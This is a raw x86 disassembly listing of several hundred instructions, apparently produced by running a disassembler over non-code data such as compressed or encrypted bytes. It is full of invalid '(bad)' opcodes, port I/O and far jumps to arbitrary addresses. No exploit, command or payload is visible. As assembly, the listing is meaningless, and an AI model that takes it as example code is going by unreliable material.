  41baa0:	xchg   BYTE PTR [eax+0x4b],dl
  41baa3:	cmp    esp,DWORD PTR [edx]
  41baa5:	pop    ebp
  41baa6:	cwde   
  41baa7:	sbb    al,0xc5
  41baa9:	pop    edi
  41baaa:	pushf  
  41baab:	(bad)  
  41baac:	int    0x61
  41baae:	hlt    
  41baaf:	nop
  41bab0:	jne    0x41ba9a
  41bab2:	into   
  41bab3:	jnp    0x41bac4
  41bab5:	ins    DWORD PTR es:[edi],dx
  41bab6:	in     eax,0x4d
  41bab8:	ret    
  41bab9:	leave  
  41baba:	adc    bl,BYTE PTR [ebx]
  41babc:	sbb    BYTE PTR [eax+0x170dfacb],0xda
  41bac3:	shr    DWORD PTR [ebx],1
  41bac5:	ja     0x41badf
  41bac7:	inc    ebx
  41bac8:	jno    0x41bb40
  41baca:	pop    ebx
  41bacb:	mov    edi,0x9610f64
  41bad0:	shl    BYTE PTR [eax+0x4f],0x86
  41bad4:	ficomp WORD PTR [ebp-0x1346f259]
  41bada:	aam    0xd4
  41badc:	repz add eax,0x51f6fe1b
  41bae2:	retf   0xad4
  41bae5:	inc    eax
  41bae6:	sbb    eax,0x1965e1d3
  41baeb:	ja     0x41bb2d
  41baed:	mov    ch,0x5f
  41baef:	mov    ebx,0x58cbe66e
  41baf4:	fwait
  41baf5:	div    DWORD PTR [ebp-0x33]
  41baf8:	jl     0x41bb22
  41bafa:	mov    DWORD PTR [edx],ebx
  41bafc:	sub    esi,DWORD PTR [ebx]
  41bafe:	pop    edx
  41baff:	call   0xdff2:0xc9e7104
  41bb06:	mov    esi,0x49a7bc1e
  41bb0b:	pop    ecx
  41bb0c:	jae    0x41bb31
  41bb0e:	mov    bh,0x85
  41bb10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb11:	ja     0x41bb0e
  41bb13:	pusha  
  41bb14:	cmp    al,0x9a
  41bb16:	dec    esi
  41bb17:	(bad)  
  41bb18:	aam    0x75
  41bb1a:	cld    
  41bb1b:	leave  
  41bb1c:	mov    eax,ds:0xc7ca819e
  41bb21:	inc    ebp
  41bb22:	jbe    0x41bb8a
  41bb24:	lods   eax,DWORD PTR ds:[esi]
  41bb25:	push   ebp
  41bb26:	enter  0x553b,0x2a
  41bb2a:	loope  0x41bb57
  41bb2c:	sub    ah,bl
  41bb2e:	sbb    eax,0xe2bdfb45
  41bb33:	test   al,0xcf
  41bb35:	out    dx,eax
  41bb36:	inc    edi
  41bb37:	idiv   BYTE PTR [esi+0x58]
  41bb3a:	dec    eax
  41bb3b:	pop    ecx
  41bb3c:	mov    eax,ds:0x465972c3
  41bb41:	enter  0x8ef,0xc0
  41bb45:	sub    bh,BYTE PTR [esi-0x2f775ec6]
  41bb4b:	mov    cl,0x83
  41bb4d:	pop    esi
  41bb4e:	xlat   BYTE PTR ds:[ebx]
  41bb4f:	in     al,0xa2
  41bb51:	out    0x15,eax
  41bb53:	adc    DWORD PTR [ebx+0x33becf9f],eax
  41bb59:	adc    dh,BYTE PTR [edi]
  41bb5b:	dec    edi
  41bb5c:	push   0x19be4bc3
  41bb61:	xor    DWORD PTR [ecx+0x3c],0xffffffb0
  41bb65:	mov    dh,0xc6
  41bb67:	scas   al,BYTE PTR es:[edi]
  41bb68:	dec    esp
  41bb69:	inc    ecx
  41bb6a:	test   BYTE PTR [esi],al
  41bb6c:	fcomp  QWORD PTR [ebx+0x4c]
  41bb6f:	fsubr  QWORD PTR [ebp-0x2b83d004]
  41bb75:	mov    bl,0x25
  41bb77:	or     dl,dl
  41bb79:	gs dec ebx
  41bb7c:	xchg   ebp,eax
  41bb7d:	or     DWORD PTR [edi-0x51c5e6ee],0x9e0b4944
  41bb87:	mov    ebx,0xf45da45c
  41bb8c:	std    
  41bb8d:	(bad)  
  41bb8e:	mov    ds:0xdd334446,al
  41bb93:	mov    ebp,0xf7051439
  41bb98:	or     ah,BYTE PTR [edx]
  41bb9a:	adc    BYTE PTR [esi],cl
  41bb9c:	mov    ds:0x50b146be,al
  41bba1:	sbb    al,0xee
  41bba3:	mov    ds:0x813f2d1c,al
  41bba8:	loope  0x41bc09
  41bbaa:	cmp    BYTE PTR [esi+0x3fedeeab],al
  41bbb0:	mov    esi,DWORD PTR ds:0x64f5a025
  41bbb6:	cmp    al,0x0
  41bbb8:	mov    bl,0x1e
  41bbba:	sti    
  41bbbb:	clc    
  41bbbc:	sub    al,0xe6
  41bbbe:	push   edx
  41bbbf:	xor    dl,bh
  41bbc1:	dec    eax
  41bbc2:	and    esp,DWORD PTR [edx+0x27]
  41bbc5:	dec    esp
  41bbc6:	and    ebx,DWORD PTR ss:[edi-0xece3915]
  41bbcd:	jle    0x41bb9e
  41bbcf:	mov    ebx,DWORD PTR ss:[ecx-0x6d]
  41bbd3:	in     al,dx
  41bbd4:	jle    0x41bb9c
  41bbd6:	jle    0x41bb90
  41bbd8:	test   eax,0x7889a070
  41bbdd:	shr    BYTE PTR [ebx-0x333e42d0],cl
  41bbe3:	(bad)
  41bbe6:	pusha  
  41bbe7:	mul    BYTE PTR [ecx]
  41bbe9:	les    ecx,FWORD PTR [edx-0x54]
  41bbec:	ret    
  41bbed:	dec    eax
  41bbee:	les    edi,FWORD PTR [edx]
  41bbf0:	inc    ebp
  41bbf1:	in     al,0xb8
  41bbf3:	fistp  DWORD PTR [edx+0x49b139f4]
  41bbf9:	mov    ebp,0x90b396e7
  41bbfe:	sbb    BYTE PTR [ecx+0x0],al
  41bc01:	add    eax,0x6d14048a
  41bc06:	rol    DWORD PTR [ebx+0x52a69e87],cl
  41bc0c:	mov    ecx,0x7492af84
  41bc11:	jo     0x41bbd9
  41bc13:	jmp    0x41bbfd
  41bc15:	sub    eax,0x51193243
  41bc1a:	in     eax,dx
  41bc1b:	cmp    ch,BYTE PTR ds:0x2bd1e886
  41bc21:	jo     0x41bbfa
  41bc23:	leave  
  41bc24:	mov    bh,0x6f
  41bc26:	das    
  41bc27:	cli    
  41bc28:	std    
  41bc29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc2a:	sbb    edi,edx
  41bc2c:	mov    esi,0xc5e5781
  41bc31:	paddb  mm3,QWORD PTR [ecx+0x20]
  41bc35:	and    dh,BYTE PTR [edx+0x29d0ff64]
  41bc3b:	xor    ebx,0x2e
  41bc3e:	int    0xe4
  41bc40:	add    BYTE PTR [ecx-0x5305d980],cl
  41bc46:	sub    al,0xe4
  41bc48:	js     0x41bc81
  41bc4a:	fdivr  QWORD PTR ds:0xa15c53d
  41bc50:	sub    al,0xdc
  41bc52:	(bad)  
  41bc53:	sbb    eax,0x7fedf952
  41bc58:	inc    edx
  41bc59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc5a:	ds jne 0x41bc82
  41bc5d:	loope  0x41bc8c
  41bc5f:	push   edx
  41bc60:	mov    cl,0x2a
  41bc62:	mov    ebx,0x6782161a
  41bc67:	dec    ebx
  41bc68:	sub    BYTE PTR [ebx-0x79],0x5b
  41bc6c:	push   0x33
  41bc6e:	push   ebp
  41bc6f:	push   ebx
  41bc70:	ret    0x539e
  41bc73:	cli    
  41bc74:	inc    esp
  41bc75:	stos   DWORD PTR es:[edi],eax
  41bc76:	pop    eax
  41bc77:	cmc    
  41bc78:	gs in  eax,dx
  41bc7a:	test   eax,0x8d478f1a
  41bc7f:	fdivr  QWORD PTR [edx]
  41bc81:	inc    ecx
  41bc82:	xor    al,0xe6
  41bc84:	pop    ss
  41bc85:	addr16 adc eax,0xe449a1fb
  41bc8b:	test   al,0x31
  41bc8d:	into   
  41bc8e:	add    al,0x23
  41bc90:	jge    0x41bd09
  41bc92:	aam    0x8d
  41bc94:	imul   eax,ebx,0xffffffaa
  41bc97:	jnp    0x41bc67
  41bc99:	in     eax,0xc
  41bc9b:	outs   dx,BYTE PTR ds:[esi]
  41bc9c:	push   si
  41bc9e:	jae    0x41bc50
  41bca0:	xchg   ebp,ebp
  41bca2:	lods   eax,DWORD PTR ds:[esi]
  41bca3:	cmp    BYTE PTR [ebx+eiz*1+0x79b9fec6],ah
  41bcaa:	lods   al,BYTE PTR ds:[esi]
  41bcab:	push   es
  41bcac:	or     bl,al
  41bcae:	mov    al,0xf8
  41bcb0:	dec    edi
  41bcb1:	jbe    0x41bceb
  41bcb3:	test   eax,0x90d00d58
  41bcb8:	mov    edi,DWORD PTR [esi+ebx*1-0x5556f215]
  41bcbf:	jp     0x41bd38
  41bcc1:	sub    BYTE PTR [edi],bh
  41bcc3:	mov    ecx,0xa440db
  41bcc8:	(bad)  
  41bcc9:	adc    bl,BYTE PTR [ebp+0x4bab16c2]
  41bccf:	xchg   esi,eax
  41bcd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bcd1:	mov    ebp,0x7ace1465
  41bcd6:	js     0x41bcac
  41bcd8:	jg     0x41bcce
  41bcda:	jle    0x41bd36
  41bcdc:	and    ch,BYTE PTR [eax+0x22229e8]
  41bce2:	adc    al,BYTE PTR [edx+0x2a7d1243]
  41bce8:	adc    edi,0x9e35cb61
  41bcee:	and    al,0x5b
  41bcf0:	sti    
  41bcf1:	and    dl,ch
  41bcf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bcf4:	mov    al,ds:0x69cc4b5
  41bcf9:	jg     0x41bc98
  41bcfb:	lahf   
  41bcfc:	sbb    DWORD PTR [ecx+0x5e],ebx
  41bcff:	inc    ebx
  41bd00:	cmc    
  41bd01:	jnp    0x41bd1a
  41bd03:	mov    ch,0xb1
  41bd05:	push   0xe
  41bd07:	push   ecx
  41bd08:	clc    
  41bd09:	das    
  41bd0a:	add    ecx,eax
  41bd0c:	pop    ss
  41bd0d:	out    dx,al
  41bd0e:	pop    esi
  41bd0f:	mov    gs,eax
  41bd11:	xlat   BYTE PTR ds:[ebx]
  41bd12:	jle    0x41bd62
  41bd14:	cmp    DWORD PTR [esi-0x169eafcb],ebp
  41bd1a:	lahf   
  41bd1b:	fisubr DWORD PTR [esi+0x7c]
  41bd1e:	stos   DWORD PTR es:[edi],eax
  41bd1f:	enter  0x78ae,0x73
  41bd23:	ds or  al,0xe6
  41bd26:	mov    bh,0x57
  41bd28:	add    al,bl
  41bd2a:	repnz pop esi
  41bd2c:	or     BYTE PTR [ecx+edx*1+0x6419e655],bl
  41bd33:	imul   esp,DWORD PTR [ebp+0x79],0x19587485
  41bd3a:	adc    eax,0x88998ea2
  41bd3f:	dec    esp
  41bd40:	ret    
  41bd41:	pop    es
  41bd42:	je     0x41bcdf
  41bd44:	xchg   ecx,eax
  41bd45:	mov    eax,0x244b7c47
  41bd4a:	arpl   dx,bx
  41bd4c:	stos   BYTE PTR es:[edi],al
  41bd4d:	ss and eax,0xe97a8ca2
  41bd53:	mov    edi,0x1f49e0f5
  41bd58:	mov    ds:0xa058ebe8,al
  41bd5d:	pop    esp
  41bd5e:	mov    ecx,0xfa78f968
  41bd63:	and    BYTE PTR [ecx-0x34529292],dl
  41bd69:	icebp  
  41bd6a:	ja     0x41bd0f
  41bd6c:	dec    ebp
  41bd6d:	push   edi
  41bd6e:	dec    edi
  41bd6f:	mov    ecx,0xf0cc3ab9
  41bd74:	cli    
  41bd75:	pop    DWORD PTR ds:0xe4bad2aa
  41bd7b:	sbb    al,0x89
  41bd7d:	mov    al,0x56
  41bd7f:	enter  0x9994,0xfc
  41bd83:	pop    ecx
  41bd84:	xor    WORD PTR [eax+0x26],dx
  41bd88:	add    BYTE PTR [esi],dh
  41bd8a:	repz cmp eax,0xc15f20ce
  41bd90:	add    DWORD PTR [eax+edx*1],ecx
  41bd93:	das    
  41bd94:	pusha  
  41bd95:	sbb    esi,DWORD PTR [edi+0x6fe7f3a0]
  41bd9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd9c:	adc    bh,BYTE PTR [ebx+eiz*4+0x2f]
  41bda0:	jno    0x41bd8e
  41bda2:	sbb    al,0x84
  41bda4:	dec    edi
  41bda5:	sbb    BYTE PTR [edx-0x16b1a5ba],bl
  41bdab:	add    BYTE PTR [esi+ecx*2],0x2a
  41bdaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bdb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bdb1:	into   
  41bdb2:	add    eax,0xf8043da1
  41bdb7:	push   edx
  41bdb8:	mov    al,ds:0x24d06e1e
  41bdbd:	pop    esi
  41bdbe:	mov    bl,bl
  41bdc0:	push   cs
  41bdc1:	push   ebp
  41bdc2:	pop    edx
  41bdc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdc4:	in     eax,0xb4
  41bdc6:	outs   dx,BYTE PTR ds:[esi]
  41bdc7:	push   edi
  41bdc8:	stos   BYTE PTR es:[edi],al
  41bdc9:	sbb    al,0x6
  41bdcb:	(bad)  
  41bdcc:	gs jbe 0x41bd6b
  41bdcf:	push   edx
  41bdd0:	adc    edi,DWORD PTR [ebp-0x54]
  41bdd3:	rol    BYTE PTR [esi],cl
  41bdd5:	in     al,dx
  41bdd6:	ins    DWORD PTR es:[edi],dx
  41bdd7:	push   edi
  41bdd8:	xchg   esi,eax
  41bdd9:	(bad)  
  41bdda:	push   ecx
  41bddb:	lds    edi,FWORD PTR [edi]
  41bddd:	(bad)  
  41bddf:	jnp    0x41be4b
  41bde1:	mov    al,ds:0x72fa2d0
  41bde6:	imul   ecx,ebx,0x575e896a
  41bdec:	mov    ds:0x163cea02,eax
  41bdf1:	sbb    dl,ch
  41bdf3:	aas    
  41bdf4:	xor    ebp,0x6d
  41bdf7:	ins    BYTE PTR es:[edi],dx
  41bdf8:	mov    ebx,0x72ba8d3e
  41bdfd:	inc    eax
  41bdfe:	gs add al,0xd3
  41be01:	in     eax,dx
  41be02:	ror    BYTE PTR [eax],cl
  41be04:	push   es
  41be05:	sbb    ah,BYTE PTR [edx-0x64]
  41be08:	adc    edx,edi
  41be0a:	fst    DWORD PTR [eax-0x53833349]
  41be10:	loop   0x41be58
  41be12:	nop
  41be13:	and    ecx,DWORD PTR [ecx]
  41be15:	lods   al,BYTE PTR ds:[esi]
  41be16:	ins    BYTE PTR es:[edi],dx
  41be17:	lods   eax,DWORD PTR ds:[esi]
  41be18:	ja     0x41bdb6
  41be1a:	pop    es
  41be1b:	push   es
  41be1c:	scas   al,BYTE PTR es:[edi]
  41be1d:	dec    esp
  41be1e:	pop    ds
  41be1f:	jo     0x41be24
  41be21:	add    al,0x8e
  41be23:	popf   
  41be24:	mov    ds:0x3cde04c8,eax
  41be29:	and    bl,ah
  41be2b:	out    0xe7,al
  41be2d:	adc    al,0xb2
  41be2f:	cmp    al,0x80
  41be31:	daa    
  41be32:	jno    0x41bdf3
  41be34:	cs iret 
  41be36:	adc    eax,0x50b67757
  41be3b:	sbb    eax,0xaca089b5
  41be40:	dec    ebp
  41be41:	pop    ecx
  41be42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be43:	or     cl,BYTE PTR [edi-0x40cdefc2]
  41be49:	out    dx,eax
  41be4a:	(bad)  
  41be4b:	ss int 0x88
  41be4e:	js     0x41becc
  41be50:	scas   al,BYTE PTR es:[edi]
  41be51:	(bad)  
  41be52:	cmp    edi,esi
  41be54:	icebp  
  41be55:	sbb    ah,BYTE PTR [esi]
  41be57:	int3   
  41be58:	pop    es
  41be59:	xchg   ebp,eax
  41be5a:	pop    ss
  41be5b:	jno    0x41be4d
  41be5d:	stos   BYTE PTR es:[edi],al
  41be5e:	aas    
  41be5f:	cmp    al,0x4c
  41be61:	retf   0x77e
  41be64:	cmp    ebx,ebp
  41be66:	push   esp
  41be67:	dec    edi
  41be68:	aas    
  41be69:	or     ecx,edi
  41be6b:	es pop esi
  41be6d:	sbb    BYTE PTR [edx+0x63],dl
  41be70:	xchg   edx,eax
  41be71:	ja     0x41be38
  41be73:	jae    0x41be0d
  41be75:	and    BYTE PTR [ebx-0x72],ch
  41be78:	call   0xd8c696db
  41be7d:	fmul   st,st(4)
  41be7f:	in     al,dx
  41be80:	outs   dx,BYTE PTR ds:[esi]
  41be81:	jg     0x41be09
  41be83:	and    dl,0x1b
  41be86:	test   BYTE PTR [ebp-0x58],ah
  41be89:	mov    ecx,0x1b87d5d7
  41be8e:	neg    BYTE PTR [ebp+eax*2+0x3b]
  41be92:	fdivr  QWORD PTR [ebx+0x15ab3fd7]
  41be98:	add    edi,DWORD PTR [ebx+0x5f]
  41be9b:	ss cmp ebp,DWORD PTR gs:[ecx-0x32]
  41bea0:	out    0xbb,al
  41bea2:	pop    ecx
  41bea3:	stc    
  41bea4:	int    0xd6
  41bea6:	call   0xca2ba180
  41beab:	push   eax
  41beac:	mov    DWORD PTR [ebp-0x43],ecx
  41beaf:	daa    
  41beb0:	mov    eax,ds:0xe25bf1f
  41beb5:	hlt    
  41beb6:	sti    
  41beb7:	outs   dx,DWORD PTR ds:[esi]
  41beb8:	dec    ebp
  41beb9:	sar    BYTE PTR [ecx-0x79],cl
  41bebc:	xchg   ebx,eax
  41bebd:	xchg   ecx,eax
  41bebe:	dec    esp
  41bebf:	mov    BYTE PTR [ebx-0x38f3334b],ah
  41bec5:	cwde   
  41bec6:	sahf   
  41bec7:	jl     0x41be97
  41bec9:	je     0x41bf1c
  41becb:	in     al,dx
  41becc:	xlat   BYTE PTR ds:[ebx]
  41becd:	cli    
  41bece:	xchg   BYTE PTR [ebx+0x3a],dh
  41bed1:	jecxz  0x41bf35
  41bed3:	inc    eax
  41bed4:	or     BYTE PTR [edx],0xc6
  41bed7:	test   BYTE PTR [ebx],bl
  41bed9:	rcl    BYTE PTR cs:[ebx+0x69],0x58
  41bede:	imul   edi,DWORD PTR [edx-0x65],0x4893111b
  41bee5:	stos   DWORD PTR es:[edi],eax
  41bee6:	or     DWORD PTR [edi+0x45],esp
  41bee9:	fisttp DWORD PTR [esi-0x44f4246a]
  41beef:	push   cs
  41bef0:	mov    BYTE PTR [edi-0x48],0xd2
  41bef4:	int    0x2b
  41bef6:	cs ret 
  41bef8:	fcmovne st,st(6)
  41befa:	push   ss
  41befb:	cmc    
  41befc:	or     BYTE PTR [ebx+eax*1-0x59d4432d],bh
  41bf03:	not    ebx
  41bf05:	mov    WORD PTR [edx-0x6],es
  41bf08:	dec    ecx
  41bf09:	ins    BYTE PTR es:[edi],dx
  41bf0a:	scas   al,BYTE PTR es:[edi]
  41bf0b:	inc    esi
  41bf0c:	push   eax
  41bf0d:	xchg   edi,eax
  41bf0e:	loopne 0x41bec3
  41bf10:	push   ds
  41bf11:	cdq    
  41bf12:	add    al,0xfa
  41bf14:	fdivp  st(5),st
  41bf16:	inc    esi
  41bf17:	mov    ss,edx
  41bf19:	mov    dl,0xd
  41bf1b:	pop    ebp
  41bf1c:	mov    bl,0x1c
  41bf1e:	jae    0x41bed0
  41bf20:	fst    DWORD PTR [eax+0x409ff86c]
  41bf26:	inc    ebx
  41bf27:	test   BYTE PTR [edi+0x19586425],dh
  41bf2d:	in     eax,dx
  41bf2e:	push   edi
  41bf2f:	in     eax,0xc6
  41bf31:	jne    0x41befc
  41bf33:	xchg   ebp,eax
  41bf34:	out    0x95,eax
  41bf36:	cmp    ecx,edx
  41bf38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf39:	not    BYTE PTR [esi-0x68]
  41bf3c:	ins    DWORD PTR es:[edi],dx
  41bf3d:	dec    ecx
  41bf3e:	retf   
  41bf3f:	sub    ch,dl
  41bf41:	inc    ebp
  41bf42:	bound  bp,DWORD PTR [ebx-0x130fdbb5]
  41bf49:	rcr    BYTE PTR [eax+0x13ba4838],0xbe
  41bf50:	cwde   
  41bf51:	mov    ebp,0xb07b94bc
  41bf56:	(bad)  [edi-0x70]
  41bf59:	inc    ebp
  41bf5a:	js     0x41bf95
  41bf5c:	hlt    
  41bf5d:	add    edx,DWORD PTR [ecx]
  41bf5f:	loop   0x41bf16
  41bf61:	jmp    0x2434:0xbde5ed0b
  41bf68:	xchg   edx,eax
  41bf69:	cli    
  41bf6a:	(bad)  
  41bf6b:	je     0x41bfae
  41bf6d:	out    0x37,al
  41bf6f:	mov    dh,0x81
  41bf71:	ds jmp 0x5bba:0x75585f43
  41bf79:	lea    eax,[edx-0x48505b31]
  41bf7f:	aas    
  41bf80:	jbe    0x41bf76
  41bf82:	gs adc ecx,ebx
  41bf85:	jecxz  0x41bf75
  41bf87:	inc    esp
  41bf88:	dec    eax
  41bf89:	sbb    BYTE PTR [eax+0x20],bh
  41bf8c:	mov    cl,0xbf
  41bf8e:	scas   al,BYTE PTR es:[edi]
  41bf8f:	lock pop esi
  41bf91:	test   bh,ch
  41bf93:	nop
  41bf94:	push   ebp
  41bf95:	(bad)  
  41bf98:	cdq    
  41bf99:	sub    eax,0x81c8c6f4
  41bf9e:	mov    ebx,0xbfd64ce4
  41bfa3:	fcomp  QWORD PTR [esi]
  41bfa5:	sti    
  41bfa6:	add    bh,ch
  41bfa8:	push   0x27
  41bfaa:	aas    
  41bfab:	ja     0x41bf67
  41bfad:	rcr    dh,0xa7
  41bfb0:	aad    0x3d
  41bfb2:	add    al,0x2f
  41bfb4:	sahf   
  41bfb5:	mov    al,0x75
  41bfb7:	or     ebp,ebx
  41bfb9:	jne    0x41bf4c
  41bfbb:	jge    0x41bf54
  41bfbd:	add    DWORD PTR [esi+0x1b],eax
  41bfc0:	xor    eax,0x88d44998
  41bfc5:	outs   dx,DWORD PTR ds:[esi]
  41bfc6:	inc    eax
  41bfc7:	cld    
  41bfc8:	(bad)  
  41bfc9:	mov    eax,ds:0x37fd5529
  41bfce:	ds popa 
  41bfd0:	fnsave [edx]
  41bfd2:	pusha  
  41bfd3:	jmp    0x6e87e887
  41bfd8:	mov    bl,0x5b
  41bfda:	mov    dh,0x87
  41bfdc:	fist   DWORD PTR [edx+0x57e16de2]
  41bfe2:	mov    edx,0x27671174
  41bfe7:	adc    eax,0xfdc1d5bb
  41bfec:	inc    edi
  41bfed:	outs   dx,DWORD PTR ds:[esi]
  41bfee:	jnp    0x41bfcc
  41bff0:	mov    ebp,DWORD PTR [esi-0x6ab6f00a]
  41bff6:	adc    ecx,DWORD PTR [edi-0x4b]
  41bff9:	shr    BYTE PTR [edi+ecx*2+0x2d],0xd
  41bffe:	inc    ebp
  41bfff:	push   0xffffffa7
  41c001:	xchg   ebx,eax
  41c002:	pop    ebp
  41c003:	mov    bl,0x3f
  41c005:	aad    0x44
  41c007:	mov    ah,0xd5
  41c009:	lods   al,BYTE PTR ds:[esi]
  41c00a:	sub    ecx,edi
  41c00c:	fcmovnbe st,st(2)
  41c00e:	mov    bl,0xe3
  41c010:	sub    BYTE PTR [edx+ebx*1-0x1f],dh
  41c014:	(bad)  
  41c015:	out    dx,al
  41c016:	clc    
  41c017:	pop    ss
  41c018:	xchg   ebp,eax
  41c019:	sar    DWORD PTR cs:[ebx-0x22],1
  41c01d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c01e:	scas   al,BYTE PTR es:[edi]
  41c01f:	dec    ebp
  41c020:	test   eax,0x71a7c3e6
  41c025:	xchg   DWORD PTR [esi+ecx*1],ebx
  41c028:	mov    cl,ch
  41c02a:	xor    dl,ah
  41c02c:	mov    cl,0x7b
  41c02e:	cmp    ah,BYTE PTR [eax+eiz*8+0x5e]
  41c032:	xlat   BYTE PTR ds:[ebx]
  41c033:	xchg   ebp,eax
  41c034:	pop    ds
  41c035:	shr    cl,cl
  41c037:	xchg   ebx,eax
  41c038:	mov    ebp,0x6608b460
  41c03d:	push   edi
  41c03e:	inc    ebx
  41c03f:	pop    ss
  41c040:	pop    esi
  41c041:	addr16 jnp 0x41c056
  41c044:	sti    
  41c045:	aad    0xd6
  41c047:	mov    eax,ds:0xead017e9
  41c04c:	shl    DWORD PTR [ecx+0x58],0xe5
  41c050:	ds jo  0x41c08e
  41c053:	call   0x996a3941
  41c058:	adc    BYTE PTR [ecx+0x5f],dh
  41c05b:	int3   
  41c05c:	aas    
  41c05d:	xor    BYTE PTR [ebx],cl
  41c05f:	jns    0x41c00c
  41c061:	sbb    al,0x55
  41c063:	sub    BYTE PTR [edx+0x7a],al
  41c066:	(bad)  [ebp-0x3f]
  41c069:	pop    edi
  41c06a:	push   0x4b
  41c06c:	mov    dl,0x55
  41c06e:	dec    edx
  41c06f:	pop    ebp
  41c070:	and    al,0x71
  41c072:	xor    BYTE PTR [esi],ah
  41c074:	and    DWORD PTR [eax-0x322642d],edx
  41c07a:	mov    ah,0x27
  41c07c:	shl    BYTE PTR [edx+ebp*1],1
  41c07f:	xor    eax,0x6c69ae3c
  41c084:	imul   esp,ebx,0xffffff82
  41c087:	and    al,0x1e
  41c089:	enter  0xb386,0xc9
  41c08d:	shl    DWORD PTR [ebx+0x27],cl
  41c090:	mov    esp,0x33e3cbc0
  41c095:	mov    ebx,0x1896a9d0
  41c09a:	test   eax,0xf0c09804
  41c09f:	stos   BYTE PTR es:[edi],al
  41c0a0:	xor    BYTE PTR [ecx+ecx*1],cl
  41c0a3:	mov    bl,0x54
  41c0a5:	pop    ebx
  41c0a6:	imul   edx,DWORD PTR [edx],0x3d7de216
  41c0ac:	add    BYTE PTR ds:0x47e17269,al
  41c0b2:	sbb    BYTE PTR [ebx],0x9d
  41c0b5:	dec    edi
  41c0b6:	aad    0x5c
  41c0b8:	test   al,0xe
  41c0ba:	into   
  41c0bb:	sbb    al,0xc4
  41c0bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0be:	inc    edx
  41c0bf:	cmc    
  41c0c0:	call   0xdc57:0xab1fe886
  41c0c7:	jmp    0x41c0d2
  41c0c9:	retf   0x8f13
  41c0cc:	fldcw  WORD PTR [ebp+0x5e]
  41c0cf:	jl     0x41c071
  41c0d1:	arpl   sp,si
  41c0d3:	push   0xffffffa6
  41c0d5:	icebp  
  41c0d6:	dec    eax
  41c0d7:	and    ah,ch
  41c0d9:	inc    ebp
  41c0da:	mov    esi,0xe228209a
  41c0df:	jmp    0x41c0f2
  41c0e1:	mov    al,0x73
  41c0e3:	rcl    ebx,cl
  41c0e5:	cmp    DWORD PTR ds:0xfa9d3b30,ecx
  41c0eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0ec:	cwde   
  41c0ed:	adc    al,0xa5
  41c0ef:	repz and BYTE PTR [ebp-0x1],dh
  41c0f3:	ret    0x2df7
  41c0f6:	sub    al,0xb7
  41c0f8:	xor    bh,0xaf
  41c0fb:	(bad)  
  41c0fc:	in     eax,dx
  41c0fd:	or     al,0xd9
  41c100:	jno    0x41c0f9
  41c102:	and    esi,DWORD PTR [edx+0x48]
  41c105:	pop    ecx
  41c106:	jecxz  0x41c141
  41c108:	lods   eax,DWORD PTR ds:[esi]
  41c109:	xchg   ebx,eax
  41c10a:	cmp    eax,0xb46772e9
  41c10f:	jns    0x41c11f
  41c111:	retf   
  41c112:	sub    BYTE PTR [edx+0x6d702980],bl
  41c118:	out    0x30,eax
  41c11a:	add    eax,0xf9dfd335
  41c11f:	pushf  
  41c120:	cdq    
  41c121:	test   BYTE PTR [eax+0x79f23770],bh
  41c127:	imul   edi,DWORD PTR [ecx+0x3d],0x58bda2d7
  41c12e:	xor    bh,bl
  41c130:	out    dx,eax
  41c131:	sbb    bh,ah
  41c133:	xor    esi,DWORD PTR [esi+0x24]
  41c136:	add    BYTE PTR [ecx],ah
  41c138:	es cmp al,0xb9
  41c13b:	pop    ss
  41c13c:	cmp    DWORD PTR [edi-0x887a05c],edx
  41c142:	xor    DWORD PTR [ebp+0x18],eax
  41c145:	cmpxchg bl,dl
  41c148:	fsubr  st,st(5)
  41c14a:	fidivr DWORD PTR [ecx+0x2b11b20e]
  41c150:	push   0x5cb95a54
  41c155:	leave  
  41c156:	xchg   ebx,eax
  41c157:	je     0x41c155
  41c159:	hlt    
  41c15a:	cmp    ebp,edx
  41c15c:	(bad)
  41c161:	xchg   edx,eax
  41c162:	add    eax,0x6149d26
  41c167:	xchg   esp,eax
  41c168:	es mov ch,0xd7
  41c16b:	jge    0x41c17f
  41c16d:	inc    BYTE PTR [edx+0x17]
  41c170:	jle    0x41c193
  41c172:	xor    edx,DWORD PTR [edi]
  41c174:	pop    eax
  41c175:	cmc    
  41c176:	test   ebx,ebx
  41c178:	fild   QWORD PTR [esp+ebp*4+0x1c275038]
  41c17f:	gs jnp 0x41c120
  41c182:	pop    ebp
  41c183:	loope  0x41c1ca
  41c185:	repz fnstsw WORD PTR [ebp-0x42]
  41c189:	jnp    0x41c134
  41c18b:	mov    ecx,0x234b76f0
  41c190:	cdq    
  41c191:	push   ebx
  41c192:	push   ebp
  41c193:	fimul  WORD PTR [ecx-0x61]
  41c196:	dec    ebp
  41c197:	push   ebp
  41c198:	jns    0x41c1eb
  41c19a:	pop    edx
  41c19b:	add    eax,0xbe384dfa
  41c1a0:	adc    ebp,DWORD PTR [edx]
  41c1a2:	adc    ecx,DWORD PTR [eax+edx*4-0x10b11800]
  41c1a9:	xchg   edx,eax
  41c1aa:	ret    
  41c1ab:	leave  
  41c1ac:	lahf   
  41c1ad:	popa   
  41c1ae:	lds    ecx,FWORD PTR [eax+ecx*4-0x77]
  41c1b2:	jle    0x41c167
  41c1b4:	dec    esi
  41c1b5:	sti    
  41c1b6:	in     eax,dx
  41c1b7:	aad    0xa6
  41c1b9:	push   es
  41c1ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1bb:	aas    
  41c1bc:	inc    edi
  41c1bd:	push   es
  41c1be:	pop    esi
  41c1bf:	push   ebp
  41c1c0:	hlt    
  41c1c1:	lahf   
  41c1c2:	shl    DWORD PTR [ebx+ebp*4-0x2abeaa4e],cl
  41c1c9:	pop    esp
  41c1ca:	popa   
  41c1cb:	into   
